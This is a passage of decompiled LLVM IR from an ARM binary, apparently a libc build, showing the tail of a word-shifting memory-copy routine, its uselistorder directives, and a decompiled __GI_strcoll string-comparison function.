  %v4_18408 = udiv i32 %v9_183fc, 65536
  %v5_18408 = or i32 %v3_18404, %v4_18408
  store i32 %v5_18408, i32* @ip, align 4
  %v3_1840c = mul i32 %v9_183fc, 65536
  %v4_18410 = udiv i32 %v6_183fc, 65536
  %v5_18410 = or i32 %v3_1840c, %v4_18410
  store i32 %v5_18410, i32* %r5.global-to-local, align 4
  %v3_18414 = mul i32 %v6_183fc, 65536
  %v4_18418 = udiv i32 %v3_183fc, 65536
  %v5_18418 = or i32 %v3_18414, %v4_18418
  store i32 %v5_18418, i32* %r4.global-to-local, align 4
  %v1_1841c = add i32 %v0_1841c, -16
  %v2_1841c = inttoptr i32 %v1_1841c to i32*
  store i32 %v5_18418, i32* %v2_1841c, align 4
  %v4_1841c = add i32 %v0_1841c, -12
  %v5_1841c = inttoptr i32 %v4_1841c to i32*
  %v6_1841c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1841c, i32* %v5_1841c, align 4
  %v7_1841c = add i32 %v0_1841c, -8
  %v8_1841c = inttoptr i32 %v7_1841c to i32*
  %v9_1841c = load i32, i32* @ip, align 4
  store i32 %v9_1841c, i32* %v8_1841c, align 4
  %v10_1841c = add i32 %v0_1841c, -4
  %v11_1841c = inttoptr i32 %v10_1841c to i32*
  %v12_1841c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1841c, i32* %v11_1841c, align 4
  store i32 %v1_1841c, i32* %r0.global-to-local, align 4
  %v0_18420 = load i32, i32* %r2.global-to-local, align 4
  %v2_18420 = add i32 %v0_18420, -16
  store i32 %v2_18420, i32* %r2.global-to-local, align 4
  %v6_18424 = icmp slt i32 %v0_18420, 16
  br i1 %v6_18424, label %dec_label_pc_18428, label %dec_label_pc_183f8.dec_label_pc_183f8_crit_edge

dec_label_pc_183f8.dec_label_pc_183f8_crit_edge:  ; preds = %dec_label_pc_183f8
  %v0_183f8.pre = load i32, i32* @r3, align 4
  %v0_183fc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_183f8

dec_label_pc_18428:                               ; preds = %dec_label_pc_183f8
  %v2_18428 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18428, i32* @r4, align 4
  %v5_18428 = load i8*, i8** %stack_var_-8, align 4
  %v6_18428 = ptrtoint i8* %v5_18428 to i32
  store i32 %v6_18428, i32* @r5, align 4
  store i32 %v11_183f4, i32* @lr, align 4
  %v2_1842c = add i32 %v0_18420, -4
  store i32 %v2_1842c, i32* %r2.global-to-local, align 4
  %v4_1842c = add i32 %v0_18420, 2147483632
  %v5_1842c = and i32 %v2_1842c, %v4_1842c
  %v6_1842c = icmp slt i32 %v5_1842c, 0
  store i1 %v6_1842c, i1* %cpsr_v.global-to-local, align 1
  %v7_1842c = icmp slt i32 %v2_1842c, 0
  store i1 %v7_1842c, i1* %cpsr_n.global-to-local, align 1
  %v8_1842c = icmp eq i32 %v2_1842c, 0
  store i1 %v8_1842c, i1* %cpsr_z.global-to-local, align 1
  %v5_18430 = icmp slt i32 %v2_18420, -12
  br i1 %v5_18430, label %dec_label_pc_1844c, label %dec_label_pc_18434

dec_label_pc_18434:                               ; preds = %dec_label_pc_18428, %dec_label_pc_183e8, %dec_label_pc_18434
  %v1_18440 = phi i32 [ %v5_18440, %dec_label_pc_18434 ], [ %v1_1841c, %dec_label_pc_18428 ], [ %v0_183b019, %dec_label_pc_183e8 ]
  %v0_18434 = load i32, i32* @r3, align 4
  %v3_18434 = mul i32 %v0_18434, 65536
  store i32 %v3_18434, i32* %ip.global-to-local, align 4
  %v0_18438 = load i32, i32* %r1.global-to-local, align 4
  %v1_18438 = add i32 %v0_18438, -4
  %v2_18438 = inttoptr i32 %v1_18438 to i32*
  %v3_18438 = load i32, i32* %v2_18438, align 4
  store i32 %v3_18438, i32* @r3, align 4
  store i32 %v1_18438, i32* %r1.global-to-local, align 4
  %v4_1843c = udiv i32 %v3_18438, 65536
  %v5_1843c = or i32 %v4_1843c, %v3_18434
  store i32 %v5_1843c, i32* @ip, align 4
  %v2_18440 = add i32 %v1_18440, -4
  %v3_18440 = inttoptr i32 %v2_18440 to i32*
  store i32 %v5_1843c, i32* %v3_18440, align 4
  %v4_18440 = load i32, i32* %r0.global-to-local, align 4
  %v5_18440 = add i32 %v4_18440, -4
  store i32 %v5_18440, i32* %r0.global-to-local, align 4
  %v0_18444 = load i32, i32* %r2.global-to-local, align 4
  %v2_18444 = add i32 %v0_18444, -4
  store i32 %v2_18444, i32* %r2.global-to-local, align 4
  %v6_18448 = icmp slt i32 %v0_18444, 4
  br i1 %v6_18448, label %dec_label_pc_1844c.loopexit, label %dec_label_pc_18434

dec_label_pc_1844c.loopexit:                      ; preds = %dec_label_pc_18434
  %v4_18444 = sub i32 3, %v0_18444
  %v5_18444 = and i32 %v4_18444, %v0_18444
  %v6_18444 = icmp slt i32 %v5_18444, 0
  %v7_18444 = icmp slt i32 %v2_18444, 0
  store i1 %v6_18444, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18444, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1844c

dec_label_pc_1844c:                               ; preds = %dec_label_pc_1844c.loopexit, %dec_label_pc_18428
  %v2_1832452 = phi i32 [ %v5_18440, %dec_label_pc_1844c.loopexit ], [ %v1_1841c, %dec_label_pc_18428 ]
  %v0_1831448 = phi i32 [ %v2_18444, %dec_label_pc_1844c.loopexit ], [ %v2_1842c, %dec_label_pc_18428 ]
  %v0_1844c = load i32, i32* %r1.global-to-local, align 4
  %v1_1844c = add i32 %v0_1844c, 2
  store i32 %v1_1844c, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_18454:                               ; preds = %dec_label_pc_18368
  br i1 %v5_18458, label %dec_label_pc_184a0, label %dec_label_pc_1845c

dec_label_pc_1845c:                               ; preds = %dec_label_pc_18454
  store i32 %v2_18454, i32* %r2.global-to-local, align 4
  %v3_18460 = load i32, i32* @r4, align 4
  store i32 %v3_18460, i32* %stack_var_-12, align 4
  %v6_18460 = load i32, i32* @r5, align 4
  %v8_18460 = inttoptr i32 %v6_18460 to i8*
  store i8* %v8_18460, i8** %stack_var_-8, align 4
  %v11_18460 = load i32, i32* @lr, align 4
  br label %dec_label_pc_18464

dec_label_pc_18464:                               ; preds = %dec_label_pc_18464.dec_label_pc_18464_crit_edge, %dec_label_pc_1845c
  %v0_18488 = phi i32 [ %v1_18488, %dec_label_pc_18464.dec_label_pc_18464_crit_edge ], [ %v0_183b019, %dec_label_pc_1845c ]
  %v0_18468 = phi i32 [ %v0_18468.pre, %dec_label_pc_18464.dec_label_pc_18464_crit_edge ], [ %v1_18368, %dec_label_pc_1845c ]
  %v0_18464 = phi i32 [ %v0_18464.pre, %dec_label_pc_18464.dec_label_pc_18464_crit_edge ], [ %v2_1836c, %dec_label_pc_1845c ]
  %v3_18464 = mul i32 %v0_18464, 16777216
  store i32 %v3_18464, i32* %lr.global-to-local, align 4
  %v1_18468 = add i32 %v0_18468, -4
  %v2_18468 = inttoptr i32 %v1_18468 to i32*
  %v3_18468 = load i32, i32* %v2_18468, align 4
  store i32 %v3_18468, i32* @r3, align 4
  %v4_18468 = add i32 %v0_18468, -8
  %v5_18468 = inttoptr i32 %v4_18468 to i32*
  %v6_18468 = load i32, i32* %v5_18468, align 4
  store i32 %v6_18468, i32* %r4.global-to-local, align 4
  %v7_18468 = add i32 %v0_18468, -12
  %v8_18468 = inttoptr i32 %v7_18468 to i32*
  %v9_18468 = load i32, i32* %v8_18468, align 4
  store i32 %v9_18468, i32* %r5.global-to-local, align 4
  %v10_18468 = add i32 %v0_18468, -16
  %v11_18468 = inttoptr i32 %v10_18468 to i32*
  %v12_18468 = load i32, i32* %v11_18468, align 4
  store i32 %v10_18468, i32* %r1.global-to-local, align 4
  %v4_1846c = udiv i32 %v12_18468, 256
  %v5_1846c = or i32 %v4_1846c, %v3_18464
  store i32 %v5_1846c, i32* %lr.global-to-local, align 4
  %v3_18470 = mul i32 %v12_18468, 16777216
  %v4_18474 = udiv i32 %v9_18468, 256
  %v5_18474 = or i32 %v3_18470, %v4_18474
  store i32 %v5_18474, i32* @ip, align 4
  %v3_18478 = mul i32 %v9_18468, 16777216
  %v4_1847c = udiv i32 %v6_18468, 256
  %v5_1847c = or i32 %v3_18478, %v4_1847c
  store i32 %v5_1847c, i32* %r5.global-to-local, align 4
  %v3_18480 = mul i32 %v6_18468, 16777216
  %v4_18484 = udiv i32 %v3_18468, 256
  %v5_18484 = or i32 %v3_18480, %v4_18484
  store i32 %v5_18484, i32* %r4.global-to-local, align 4
  %v1_18488 = add i32 %v0_18488, -16
  %v2_18488 = inttoptr i32 %v1_18488 to i32*
  store i32 %v5_18484, i32* %v2_18488, align 4
  %v4_18488 = add i32 %v0_18488, -12
  %v5_18488 = inttoptr i32 %v4_18488 to i32*
  %v6_18488 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_18488, i32* %v5_18488, align 4
  %v7_18488 = add i32 %v0_18488, -8
  %v8_18488 = inttoptr i32 %v7_18488 to i32*
  %v9_18488 = load i32, i32* @ip, align 4
  store i32 %v9_18488, i32* %v8_18488, align 4
  %v10_18488 = add i32 %v0_18488, -4
  %v11_18488 = inttoptr i32 %v10_18488 to i32*
  %v12_18488 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18488, i32* %v11_18488, align 4
  store i32 %v1_18488, i32* %r0.global-to-local, align 4
  %v0_1848c = load i32, i32* %r2.global-to-local, align 4
  %v2_1848c = add i32 %v0_1848c, -16
  store i32 %v2_1848c, i32* %r2.global-to-local, align 4
  %v6_18490 = icmp slt i32 %v0_1848c, 16
  br i1 %v6_18490, label %dec_label_pc_18494, label %dec_label_pc_18464.dec_label_pc_18464_crit_edge

dec_label_pc_18464.dec_label_pc_18464_crit_edge:  ; preds = %dec_label_pc_18464
  %v0_18464.pre = load i32, i32* @r3, align 4
  %v0_18468.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18464

dec_label_pc_18494:                               ; preds = %dec_label_pc_18464
  %v2_18494 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18494, i32* @r4, align 4
  %v5_18494 = load i8*, i8** %stack_var_-8, align 4
  %v6_18494 = ptrtoint i8* %v5_18494 to i32
  store i32 %v6_18494, i32* @r5, align 4
  store i32 %v11_18460, i32* @lr, align 4
  %v2_18498 = add i32 %v0_1848c, -4
  store i32 %v2_18498, i32* %r2.global-to-local, align 4
  %v4_18498 = add i32 %v0_1848c, 2147483632
  %v5_18498 = and i32 %v2_18498, %v4_18498
  %v6_18498 = icmp slt i32 %v5_18498, 0
  store i1 %v6_18498, i1* %cpsr_v.global-to-local, align 1
  %v7_18498 = icmp slt i32 %v2_18498, 0
  store i1 %v7_18498, i1* %cpsr_n.global-to-local, align 1
  %v8_18498 = icmp eq i32 %v2_18498, 0
  store i1 %v8_18498, i1* %cpsr_z.global-to-local, align 1
  %v5_1849c = icmp slt i32 %v2_1848c, -12
  br i1 %v5_1849c, label %dec_label_pc_184b8, label %dec_label_pc_184a0

dec_label_pc_184a0:                               ; preds = %dec_label_pc_18494, %dec_label_pc_18454, %dec_label_pc_184a0
  %v1_184ac = phi i32 [ %v5_184ac, %dec_label_pc_184a0 ], [ %v1_18488, %dec_label_pc_18494 ], [ %v0_183b019, %dec_label_pc_18454 ]
  %v0_184a0 = load i32, i32* @r3, align 4
  %v3_184a0 = mul i32 %v0_184a0, 16777216
  store i32 %v3_184a0, i32* %ip.global-to-local, align 4
  %v0_184a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_184a4 = add i32 %v0_184a4, -4
  %v2_184a4 = inttoptr i32 %v1_184a4 to i32*
  %v3_184a4 = load i32, i32* %v2_184a4, align 4
  store i32 %v3_184a4, i32* @r3, align 4
  store i32 %v1_184a4, i32* %r1.global-to-local, align 4
  %v4_184a8 = udiv i32 %v3_184a4, 256
  %v5_184a8 = or i32 %v4_184a8, %v3_184a0
  store i32 %v5_184a8, i32* @ip, align 4
  %v2_184ac = add i32 %v1_184ac, -4
  %v3_184ac = inttoptr i32 %v2_184ac to i32*
  store i32 %v5_184a8, i32* %v3_184ac, align 4
  %v4_184ac = load i32, i32* %r0.global-to-local, align 4
  %v5_184ac = add i32 %v4_184ac, -4
  store i32 %v5_184ac, i32* %r0.global-to-local, align 4
  %v0_184b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_184b0 = add i32 %v0_184b0, -4
  store i32 %v2_184b0, i32* %r2.global-to-local, align 4
  %v6_184b4 = icmp slt i32 %v0_184b0, 4
  br i1 %v6_184b4, label %dec_label_pc_184b8.loopexit, label %dec_label_pc_184a0

dec_label_pc_184b8.loopexit:                      ; preds = %dec_label_pc_184a0
  %v4_184b0 = sub i32 3, %v0_184b0
  %v5_184b0 = and i32 %v4_184b0, %v0_184b0
  %v6_184b0 = icmp slt i32 %v5_184b0, 0
  %v7_184b0 = icmp slt i32 %v2_184b0, 0
  store i1 %v6_184b0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_184b0, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_184b8

dec_label_pc_184b8:                               ; preds = %dec_label_pc_184b8.loopexit, %dec_label_pc_18494
  %v2_1832453 = phi i32 [ %v5_184ac, %dec_label_pc_184b8.loopexit ], [ %v1_18488, %dec_label_pc_18494 ]
  %v0_1831449 = phi i32 [ %v2_184b0, %dec_label_pc_184b8.loopexit ], [ %v2_18498, %dec_label_pc_18494 ]
  %v0_184b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_184b8 = add i32 %v0_184b8, 1
  store i32 %v1_184b8, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_184ac, { 0, 2, 1 }
  uselistorder i32 %v3_184a0, { 1, 0 }
  uselistorder i32 %v2_18498, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18488, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18468, { 1, 0 }
  uselistorder i32 %v3_18464, { 1, 0 }
  uselistorder i32 %v0_18468, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18488, { 3, 2, 1, 0 }
  uselistorder i32 %v5_18440, { 0, 2, 1 }
  uselistorder i32 %v3_18434, { 1, 0 }
  uselistorder i32 %v2_1842c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1841c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_183fc, { 1, 0 }
  uselistorder i32 %v3_183f8, { 1, 0 }
  uselistorder i32 %v0_183fc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1841c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_183d4, { 0, 2, 1 }
  uselistorder i32 %v3_183c8, { 1, 0 }
  uselistorder i32 %v2_183c0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_183b0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18390, { 1, 0 }
  uselistorder i32 %v3_1838c, { 1, 0 }
  uselistorder i32 %v0_18390, { 3, 2, 1, 0 }
  uselistorder i32 %v0_183b0, { 3, 2, 1, 0 }
  uselistorder i1 %v5_18458, { 2, 0, 1 }
  uselistorder i32 %v0_18370, { 1, 0 }
  uselistorder i32 %v0_1845c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_183b019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_18360, { 2, 1, 0 }
  uselistorder i32 %v0_18360, { 2, 0, 1 }
  uselistorder i32 %v2_18358, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_18358, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18358, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_183b020, { 2, 1, 0 }
  uselistorder i32 %v11_18334, { 1, 0 }
  uselistorder i32 %v7_18334, { 1, 0 }
  uselistorder i32 %v1_18314, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_18314, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18318, { 1, 0 }
  uselistorder i32 %v7_1830c, { 0, 2, 1 }
  uselistorder i32 %v10_18308, { 1, 0 }
  uselistorder i32 %v9_18300, { 1, 0, 2 }
  uselistorder i32 %v6_182fc, { 1, 0 }
  uselistorder i32 %v2_182f4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_182f4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_18304, { 0, 3, 2, 1 }
  uselistorder i32 %v7_182e8, { 0, 2, 1 }
  uselistorder i32 %v13_182e4, { 1, 0 }
  uselistorder i32 %v4_182e0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_182e0, { 2, 0, 1 }
  uselistorder i32 %v6_182e8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_182d8, { 0, 2, 1 }
  uselistorder i32 %v16_182d4, { 1, 0 }
  uselistorder i32 %v4_182d0, { 1, 2, 0 }
  uselistorder i32 %v0_182e0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_182d8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_182c4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_182c0, { 1, 0 }
  uselistorder i32 %v1_182bc, { 1, 0 }
  uselistorder i32 %v10_182b8, { 1, 0 }
  uselistorder i32 %v0_182b8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_182bc, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_182b0, { 0, 2, 1 }
  uselistorder i32 %v2_182a4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_182a4, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_182bc37, { 1, 2, 0 }
  uselistorder i32 %v1_1829c, { 2, 1, 0 }
  uselistorder i32 %v1_18294, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1828c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_18288, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_18284, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_18284, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_18274, { 0, 2, 1 }
  uselistorder i32 %v4_18270, { 1, 0 }
  uselistorder i32 %v3_18264, { 1, 0 }
  uselistorder i32 %v1_1825c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18250, { 1, 0 }
  uselistorder i32 %v12_1824c, { 0, 2, 1 }
  uselistorder i32 %v8_1822c, { 1, 0, 2 }
  uselistorder i32 %v5_1822c, { 1, 0, 2 }
  uselistorder i32 %v2_1822c, { 1, 0, 2 }
  uselistorder i32 %v0_1822c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1824c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_18208, { 0, 2, 1 }
  uselistorder i32 %v4_18204, { 1, 0 }
  uselistorder i32 %v3_181f8, { 1, 0 }
  uselistorder i32 %v1_181f0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_181e4, { 1, 0 }
  uselistorder i32 %v12_181e0, { 0, 2, 1 }
  uselistorder i32 %v8_181c0, { 1, 0, 2 }
  uselistorder i32 %v5_181c0, { 1, 0, 2 }
  uselistorder i32 %v2_181c0, { 1, 0, 2 }
  uselistorder i32 %v0_181c0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_181e0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1819c, { 0, 2, 1 }
  uselistorder i32 %v4_18198, { 1, 0 }
  uselistorder i32 %v3_1818c, { 1, 0 }
  uselistorder i32 %v1_18184, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18178, { 1, 0 }
  uselistorder i32 %v12_18174, { 0, 2, 1 }
  uselistorder i32 %v8_18154, { 1, 0, 2 }
  uselistorder i32 %v5_18154, { 1, 0, 2 }
  uselistorder i32 %v2_18154, { 1, 0, 2 }
  uselistorder i32 %v0_18154, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18174, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_181b0, { 0, 2, 1 }
  uselistorder i32 %v1_181ac, { 2, 0, 1, 3 }
  uselistorder i32 %v4_18130, { 2, 0, 1, 3 }
  uselistorder i32 %v2_18130, { 2, 0, 1, 3 }
  uselistorder i32 %v0_181b4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1824c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_18124, { 1, 0 }
  uselistorder i32 %v0_18124, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1811c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1811c, { 1, 0, 2 }
  uselistorder i32 %v0_1811c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1824c77, { 1, 0 }
  uselistorder i32 %v1_180fc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_18104, { 1, 0 }
  uselistorder i32 %v0_180d8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_180cc, { 1, 2, 0, 3 }
  uselistorder i32 %v5_180b8, { 1, 0, 2 }
  uselistorder i32 %v1_180b4, { 1, 0 }
  uselistorder i32 %v1_180ac, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_180ac, { 1, 2, 0, 3 }
  uselistorder i32 %v4_180a4, { 0, 2, 1 }
  uselistorder i32 %v3_180a4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_180a4, { 1, 0 }
  uselistorder i1 %v1_180a4, { 1, 0 }
  uselistorder i32 %v3_180a0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18098, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_18084, { 1, 2, 0 }
  uselistorder i32 %v1_1807c, { 0, 2, 1 }
  uselistorder i32 %v12_18078, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1806c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18070, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_18060, { 0, 2, 1 }
  uselistorder i32 %v1_18058, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_18058, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_18050, { 1, 0 }
  uselistorder i32 %v1_18048, { 2, 1, 0 }
  uselistorder i32 %v2_18040, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_18040, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1803c, { 1, 0 }
  uselistorder i32 %v2_18030, { 1, 0 }
  uselistorder i32 %v1_18030, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_18030, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 7, 0, 9, 1, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 5, 21, 22, 23, 24, 25, 4, 26, 2, 27, 3, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 2, 7, 0, 9, 1, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 6, 21, 22, 23, 5, 24, 3, 25, 4, 27, 26, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 6, 7, 0, 9, 1, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 5, 22, 23, 24, 25, 26, 4, 27, 2, 28, 3, 30, 29, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24, 25 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 6, 5 }
  uselistorder i32 27, { 1, 0, 2, 6, 3, 7, 4, 8, 5, 9 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 60, 61, 62, 6, 18, 19, 20, 63, 64, 65, 7, 21, 22, 23, 66, 67, 68, 8, 24, 25, 69, 16, 15, 70, 71, 72, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 73, 10, 33, 47, 48, 49, 9, 50, 51, 52, 34, 46, 2, 35, 40, 41, 42, 43, 44, 45, 0, 1, 53, 54, 55, 56, 57, 58, 59, 36, 37, 38, 39 }
  uselistorder label %dec_label_pc_184a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18434, { 2, 0, 1 }
  uselistorder label %dec_label_pc_183c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18368, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_182f4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_182b8, { 1, 0 }
  uselistorder label %dec_label_pc_182a4, { 1, 0 }
  uselistorder label %dec_label_pc_18264, { 2, 0, 1 }
  uselistorder label %dec_label_pc_181f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1818c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1812c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_180fc, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_18098, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_18058, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_184c4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_184c4 = phi i32 [ %v0_184c4.pre, %bb ], [ %v5_184c4, %bb3 ]
  %v0_184c0 = phi i32 [ %tmp, %bb ], [ %v5_184c0, %bb3 ]
  %v1_184c0 = inttoptr i32 %v0_184c0 to i8*
  %v2_184c0 = load i8, i8* %v1_184c0, align 1
  %v1_184c4 = inttoptr i32 %v0_184c4 to i8*
  %v2_184c4 = load i8, i8* %v1_184c4, align 1
  %v3_184c4 = zext i8 %v2_184c4 to i32
  %v2_184c8 = icmp eq i8 %v2_184c0, 0
  br i1 %v2_184c8, label %.dec_label_pc_184d4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_184c4 = add i32 %v0_184c4, 1
  %v5_184c0 = add i32 %v0_184c0, 1
  %v3_184c0 = zext i8 %v2_184c0 to i32
  %v10_184cc = icmp eq i8 %v2_184c0, %v2_184c4
  br i1 %v10_184cc, label %entry, label %dec_label_pc_184d4

.dec_label_pc_184d4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_184d4

dec_label_pc_184d4:                               ; preds = %bb3, %.dec_label_pc_184d4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_184d4_crit_edge ], [ %v3_184c0, %bb3 ]
  %v2_184d4.pre-phi = sub nsw i32 %.pn, %v3_184c4
  ret i32 %v2_184d4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_184c0, { 0, 2, 1 }
  uselistorder i32 %v0_184c0, { 1, 0 }
  uselistorder i32 %v0_184c4, { 1, 0 }
  uselistorder label %dec_label_pc_184d4, { 1, 0 }
}

